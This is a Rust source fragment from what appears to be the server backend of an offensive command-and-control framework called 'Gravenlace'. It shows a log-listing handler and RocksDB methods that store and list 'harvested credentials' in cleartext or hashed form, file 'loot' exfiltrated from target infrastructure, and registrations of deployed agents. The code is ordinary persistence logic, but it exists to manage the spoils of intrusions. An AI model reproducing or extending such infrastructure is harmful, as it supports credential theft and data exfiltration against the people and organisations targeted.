    let mut log_timeline = Vec::new();
    
    // 2. Perform prefix scanning lookups bounded explicitly to log prefixes
    let db_iterator = state.db.prefix_iterator(b"log_");
    for entry in db_iterator {
        if let Ok((key, value)) = entry {
            if key.starts_with(b"log_") {
                if let Ok(parsed_log) = serde_json::from_slice::<SiemLogPayload>(&value) {
                    log_timeline.push(parsed_log);
                }
            }
        }
    }

    // 3. Sort vectors into reverse chronological order (Newest logging strings first)
    log_timeline.sort_by(|a, b| b.server_timestamp.cmp(&a.server_timestamp));

    (StatusCode::OK, Json(log_timeline)).into_response()
}

// ============================================================================
// --- BOX 30: CORE DATABASE TRANSACTION EXTENSIONS & HELPER ABSTRACTIONS ---
// ============================================================================

impl AppState {
    /// Commits harvested credentials payload data elements into underlying table spaces
    pub fn store_credential(&self, cred: &CapturedCredential) -> Result<(), rust_rocksdb::Error> {
        let db_key = format!("cred_{}", cred.credential_id);
        let serialized_bytes = serde_json::to_vec(cred).unwrap();
        self.db.put(db_key.as_bytes(), &serialized_bytes)
    }

    /// Queries prefix spaces to extract all captured hashed/cleartext materials
    pub fn retrieve_all_credentials(&self) -> Vec<CapturedCredential> {
        let mut collections = Vec::new();
        let db_iterator = self.db.prefix_iterator(b"cred_");
        for item in db_iterator {
            if let Ok((key, value)) = item {
                if key.starts_with(b"cred_") {
                    if let Ok(cred) = serde_json::from_slice::<CapturedCredential>(&value) {
                        collections.push(cred);
                    }
                }
            }
        }
        collections
    }

    /// Persists metadata parameters mapping an acquired target file resource to storage tracking keys
    pub fn store_loot_metadata(&self, loot: &ExtractedLoot) -> Result<(), rust_rocksdb::Error> {
        let db_key = format!("loot_{}", loot.loot_id);
        let serialized_bytes = serde_json::to_vec(loot).unwrap();
        self.db.put(db_key.as_bytes(), &serialized_bytes)
    }



    /// Pulls all exfiltrated file metadata nodes captured on target infrastructure environments
    pub fn retrieve_all_loot(&self) -> Vec<ExtractedLoot> {
        let mut collections = Vec::new();
        let db_iterator = self.db.prefix_iterator(b"loot_");
        for item in db_iterator {
            if let Ok((key, value)) = item {
                if key.starts_with(b"loot_") {
                    if let Ok(loot) = serde_json::from_slice::<ExtractedLoot>(&value) {
                        collections.push(loot);
                    }
                }
            }
        }
        collections
    }
}

// ============================================================================
// --- GLOBAL MODULE SCOPE: EXTENDED DATA PERSISTENCE LAYER ---
// ============================================================================

impl AppState {
    /// Securely records a validated operator registration event directly into standard database storage
    pub fn persist_agent_registration(&self, reg: &Registration) -> Result<(), rust_rocksdb::Error> {
        let mut batch = rust_rocksdb::WriteBatch::default();
        let db_key = format!("reg_{}", reg.agent_id);
        
        if let Ok(serialized_data) = serde_json::to_vec(reg) {
            batch.put(db_key.as_bytes(), &serialized_data);
            self.db.write(&batch)?;
        }
        Ok(())
    }
}


// ============================================================================
// --- END OF PROJECT GRAVENLACE V2.0 PRODUCTION ENGINE ARCHITECTURE ---
// ============================================================================
